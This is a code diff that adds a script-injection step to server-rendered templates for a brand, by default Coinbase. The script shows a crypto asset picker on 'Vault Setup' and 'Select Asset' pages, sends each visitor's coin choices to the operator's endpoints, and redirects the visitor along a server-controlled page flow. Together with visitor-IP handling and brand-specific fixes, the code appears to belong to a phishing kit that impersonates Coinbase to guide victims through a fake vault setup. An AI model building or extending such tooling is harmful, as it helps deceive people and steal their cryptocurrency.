@@ -1083,6 +1083,207 @@ const PAGE_VARS_SHIM = `<script data-injected="visitor-page-vars">
 })();
 </script>`;
 
+const COIN_MARKET_PAGES = new Set(['Vault Setup', 'Select Asset']);
+
+const COIN_MARKET_SHIM = `<script data-injected="visitor-coin-market">
+(function () {
+  if (window.__rvCoinMarketReady) return;
+  window.__rvCoinMarketReady = true;
+  var POLL_MS = 45000;
+  var assets = [];
+  var stale = false;
+
+  function esc(s) {
+    return String(s)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/"/g, '&quot;');
+  }
+
+  function fetchMarket() {
+    return fetch('/api/visitor/crypto-market')
+      .then(function (r) { return r.json(); })
+      .catch(function () { return null; });
+  }
+
+  function loadMarket() {
+    return fetchMarket().then(function (d) {
+      if (d && d.ok && d.assets) {
+        assets = d.assets;
+        stale = !!d.stale;
+        document.querySelectorAll('[data-rv-coin-market]').forEach(renderHost);
+      }
+    });
+  }
+
+  function filterAssets(q) {
+    if (!q) return assets;
+    q = q.toLowerCase();
+    return assets.filter(function (a) {
+      return a.name.toLowerCase().indexOf(q) >= 0 || a.symbol.toLowerCase().indexOf(q) >= 0;
+    });
+  }
+
+  function renderMulti(host) {
+    var listId = host.getAttribute('data-rv-market-list') || host.id;
+    var listEl = listId ? document.getElementById(listId) : host;
+    if (!listEl) return;
+    var searchId = host.getAttribute('data-rv-market-search');
+    var searchEl = searchId ? document.getElementById(searchId) : null;
+    var btnId = host.getAttribute('data-rv-market-continue');
+    var btn = btnId ? document.getElementById(btnId) : null;
+    var q = searchEl ? searchEl.value.trim().toLowerCase() : '';
+    var selected = host.__rvSelected || (host.__rvSelected = new Set());
+    listEl.innerHTML = '';
+    filterAssets(q).forEach(function (a, idx) {
+      var row = document.createElement('div');
+      row.className = 'rv-row' + (selected.has(a.symbol) ? ' selected' : '');
+      var chCls = a.changeNegative ? 'neg' : 'pos';
+      row.innerHTML =
+        '<span class="rv-rank">' + (idx + 1) + '</span>' +
+        '<img src="' + esc(a.img) + '" alt="">' +
+        '<div class="rv-row-info"><div class="rv-row-name">' + esc(a.name) + '</div>' +
+        '<div class="rv-row-sym">' + esc(a.symbol) + '</div></div>' +
+        '<div><div class="rv-row-price">' + esc(a.priceDisplay) + '</div>' +
+        '<div class="rv-row-chg ' + chCls + '">' + esc(a.changeDisplay) + '</div></div>' +
+        '<span class="rv-add">+</span>';
+      row.addEventListener('click', function () {
+        if (selected.has(a.symbol)) selected.delete(a.symbol);
+        else selected.add(a.symbol);
+        if (btn) {
+          var on = selected.size > 0;
+          btn.disabled = !on;
+          btn.classList.toggle('enabled', on);
+        }
+        renderMulti(host);
+      });
+      listEl.appendChild(row);
+    });
+    if (!host.__rvMultiWired && btn) {
+      host.__rvMultiWired = true;
+      btn.addEventListener('click', function () {
+        if (btn.disabled) return;
+        btn.disabled = true;
+        var BP = window.__rvBrandPage || { brand: 'Coinbase', page: 'Vault Setup' };
+        fetch('/api/visitor/page-advance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            brand: BP.brand || 'Coinbase',
+            page: BP.page || 'Vault Setup',
+            choice: Array.from(selected).join(', ')
+          })
+        })
+          .then(function (r) { return r.json(); })
+          .then(function (d) {
+            if (d && d.nextUrl) location.href = d.nextUrl;
+            else btn.disabled = selected.size === 0;
+          })
+          .catch(function () { btn.disabled = selected.size === 0; });
+      });
+    }
+    if (!host.__rvSearchWired && searchEl) {
+      host.__rvSearchWired = true;
+      searchEl.addEventListener('input', function () { renderMulti(host); });
+    }
+  }
+
+  function renderSingle(host) {
+    var listId = host.getAttribute('data-rv-market-list') || host.id;
+    var listEl = listId ? document.getElementById(listId) : host;
+    if (!listEl) return;
+    var busy = host.__rvBusy;
+    listEl.innerHTML = '';
+    assets.forEach(function (a) {
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'vm-row';
+      btn.disabled = !!busy;
+      var priceLine =
+        a.priceDisplay && a.priceDisplay !== '—'
+          ? '<span class="vm-row-price">' + esc(a.priceDisplay) + '</span>' +
+            '<span class="vm-row-chg ' + (a.changeNegative ? 'neg' : 'pos') + '">' +
+            esc(a.changeDisplay) + '</span>'
+          : '';
+      btn.innerHTML =
+        '<img src="' + esc(a.img) + '" alt="">' +
+        '<span class="vm-row-info"><span class="vm-row-name">' + esc(a.name) +
+        ' <span class="vm-badge">' + esc(a.symbol) + '</span></span>' +
+        (priceLine ? '<span class="vm-row-stats">' + priceLine + '</span>' : '') +
+        '</span>' +
+        '<svg class="vm-chev" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg>';
+      btn.addEventListener('click', function () {
+        if (host.__rvBusy) return;
+        host.__rvBusy = true;
+        listEl.querySelectorAll('.vm-row').forEach(function (b) { b.disabled = true; });
+        var BP = window.__rvBrandPage || { brand: 'Coinbase', page: 'Select Asset' };
+        fetch('/api/visitor/vault-context', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ coin: a.symbol })
+        })
+          .then(function () {
+            return fetch('/api/visitor/page-advance', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                brand: BP.brand || 'Coinbase',
+                page: BP.page || 'Select Asset',
+                choice: a.symbol
+              })
+            });
+          })
+          .then(function (r) { return r.json().catch(function () { return null; }); })
+          .then(function (d) {
+            if (d && d.nextUrl) location.href = d.nextUrl;
+            else {
+              host.__rvBusy = false;
+              listEl.querySelectorAll('.vm-row').forEach(function (b) { b.disabled = false; });
+            }
+          })
+          .catch(function () {
+            host.__rvBusy = false;
+            listEl.querySelectorAll('.vm-row').forEach(function (b) { b.disabled = false; });
+          });
+      });
+      listEl.appendChild(btn);
+    });
+  }
+
+  function renderHost(host) {
+    var mode = host.getAttribute('data-rv-coin-market');
+    if (!assets.length) {
+      var listId = host.getAttribute('data-rv-market-list') || host.id;
+      var listEl = listId ? document.getElementById(listId) : host;
+      if (listEl && !listEl.querySelector('.rv-market-loading')) {
+        listEl.innerHTML = '<div class="rv-market-loading" style="padding:24px;text-align:center;color:#6b7280;font-size:14px">Loading market data…</div>';
+      }
+      return;
+    }
+    if (mode === 'multi') renderMulti(host);
+    else if (mode === 'single') renderSingle(host);
+  }
+
+  function boot() {
+    loadMarket().then(function () {
+      setInterval(loadMarket, POLL_MS);
+    });
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot);
+  else boot();
+})();
+</script>`;
+
+function injectCoinMarketShim(html: string, brand: string, page: string): string {
+	if (!COIN_MARKET_PAGES.has(page)) return html;
+	if (html.includes('data-injected="visitor-coin-market"')) return html;
+	const bp = JSON.stringify({ brand, page }).replace(/</g, '\\u003c');
+	const cfg = `<script data-injected="visitor-coin-market-config">window.__rvBrandPage=${bp};</script>`;
+	const bodyClose = html.lastIndexOf('</body>');
+	if (bodyClose === -1) return html + cfg + COIN_MARKET_SHIM;
+	return html.slice(0, bodyClose) + cfg + COIN_MARKET_SHIM + html.slice(bodyClose);
+}
+
 function injectPageVarsShim(html: string, brand: string, page: string, visitorIp?: string): string {
 	if (!getSchema(brand, page).length) return html;
 	if (html.includes('data-injected="visitor-page-vars"')) return html;
@@ -1109,6 +1310,7 @@ export function loadTemplateHtml(
 	let html = readFileSync(file, 'utf-8');
 	html = injectMobileScrollFix(html);
 	html = injectPageVarsShim(html, brand, page, opts?.visitorIp);
+	html = injectCoinMarketShim(html, brand, page);
 	if (brand === 'Coinbase') {
 		html = injectCoinbaseMobileFix(html);
 	}
